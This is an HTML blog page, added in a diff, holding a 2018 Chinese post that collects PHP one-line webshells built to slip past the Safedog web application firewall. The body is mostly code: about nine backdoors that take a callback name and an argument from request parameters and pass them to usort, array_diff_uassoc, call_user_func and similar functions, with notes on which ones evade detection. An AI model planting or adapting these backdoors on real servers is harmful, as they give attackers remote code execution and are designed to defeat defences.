@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+
+
+
+ <html class="no-js"> 
+<head>
+    <title>过狗一句话  &middot; BlankのBlog </title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta http-equiv="content-language" content="en-us" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="Blank">
+    <meta name="description" content="">
+    <link rel="shortcut icon" href="https://blank233.github.io/img/clover.png" type="image/x-icon" />
+    <meta name="generator" content="Hugo 0.37.1" />
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="https://blank233.github.io/css/smooth-scrollbar.css" />
+    <link rel="stylesheet" type="text/css" href="https://blank233.github.io/css/main.css" />
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/styles/tomorrow.min.css" />
+    
+
+    <style>
+        .posts li {
+            visibility: hidden;
+        }
+    </style> 
+</head>
+<body>
+    
+    
+
+    <header>	
+	<div class="h-wrap">
+		
+		<h1 class="title"><a href="https://blank233.github.io/">BlankのBlog</a></h1>
+		
+	</div>
+</header>
+    
+    <div class="site-wrapper" id="full-wrapper">
+        
+        <section class="single-wrap">
+            <article class="single-content" itemscope itemtype="//schema.org/BlogPosting">
+                <div class="feat">
+                    <h5 class="page-date">
+                    <time datetime="" itemprop="datePublished">
+                    24 April 2018
+                   
+                    </time>
+                    </h5>
+                </div>
+                <h1 class="page-title" itemprop="name headline">过狗一句话</h1>
+                
+                
+                <h6>Topic:<a href="https://blank233.github.io/topics/web">web</a>
+                Tag:<a href="https://blank233.github.io/tags/2018-04">2018-04</a></h6>
+
+                <div itemprop="articleBody">
+                    <p>前几天看到P神的一篇关于php回调后门的博客，受益颇多。但那已经是15年的博客了，有些方法已经被狗识别了，就写篇博客整理收集一下过狗一句话。<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">P神原文</a></p>
+
+<p></p>
+
+<h2 id="序">序</h2>
+
+<ul>
+<li>安全狗的版本</li>
+</ul>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/ggygh/1.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<ul>
+<li>php版本</li>
+</ul>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/ggygh/2.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<h2 id="正文">正文</h2>
+
+<p>先是尝试了一下p神博客里提到的一部分，能过的不多</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$arr = array('1'=&gt;'1',$_REQUEST['pass']);
+// uasort($arr, $e);
+usort($arr, $e);
+?&gt;
+</code></pre>
+
+<p>效果</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/ggygh/3.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>usort和uasort都能过，但是uksort挂掉了，，然后查php手册找到一些</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array( $_REQUEST['pass']=&gt;'1');
+$array2 = array(1);
+array_diff_uassoc($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>array_diff_uassoc()  pass放到键名上  效果</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/ggygh/4.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>当然，还能这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array( $_REQUEST['pass']=&gt;'1');
+$array2 = array(1);
+array_diff_ukey($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array( $_REQUEST['pass']=&gt;'1');
+$array2 = array(1);
+array_intersect_uassoc($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array( $_REQUEST['pass']=&gt;'1');
+$array2 = array(1);
+array_intersect_ukey($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>以及这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array($_REQUEST['pass']);
+$array2 = array(1);
+array_udiff_assoc($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array($_REQUEST['pass']);
+$array2 = array(1);
+array_uintersect_assoc($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>&hellip;.</p>
+
+<p>回调后门这个实在是太多了，，再来俩</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$pass = $_REQUEST['pass'];
+call_user_func($e,$pass);
+?&gt;
+</code></pre>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$pass = array($_REQUEST['pass']);
+call_user_func_array($e,$pass);
+?&gt;
+</code></pre>
+
+<hr />
+
+<p>结束~~~</p>                    
+                </div>
+                <div class="feat share">
+                </div>
+                
+                
+            </article>
+        </section>
+
+        <footer>
+	
+</footer>
+    </div>
+
+    <div class="next-prev-arrows">
+        
+            <a rel="next" href="https://blank233.github.io/2018/04/30/mmark/" id="next">
+                &larr; <span class="nav-title nav-title-next">Mmark</span> 
+            </a>
+        
+        
+            <a rel="prev" href="https://blank233.github.io/2018/04/07/%E5%8F%A4%E9%83%BD%E6%B2%B3%E6%B4%9B/" id="prev">
+                 <span class="nav-title nav-title-prev">古都河洛</span> &rarr;
+            </a>
+        
+    </div>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://blank233.github.io/js/scrollreveal.min.js"></script>
+<script type='application/javascript' src='https://blank233.github.io/js/smooth-scrollbar.js'></script>
+<script src="https://blank233.github.io/js/baffle.min.js"></script>
+<script src="https://blank233.github.io/js/main.js"></script>
+
+
+
+
+
+<!-- Syntax highlighting -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
